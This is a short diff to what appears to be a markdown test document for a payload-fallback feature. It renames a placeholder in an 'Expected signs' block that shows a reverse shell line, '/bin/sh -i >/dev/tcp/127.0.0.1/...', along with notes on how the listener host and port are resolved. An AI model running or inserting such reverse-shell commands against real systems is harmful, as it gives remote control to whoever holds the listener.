@@ -169,9 +169,9 @@ tmux kill-session -t codex-ii-payload-fallback
 Expected signs:
 
 ```text
-/bin/sh -i >/dev/tcp/127.0.0.1/${II_LPORT} 2>&1 0>&1
+/bin/sh -i >/dev/tcp/127.0.0.1/${lport} 2>&1 0>&1
 lhost used from shell: 127.0.0.1
-lport unresolved: kept as ${II_LPORT}
+lport unresolved: kept as ${lport}
 ```
 
 ## Special Character Copy Test
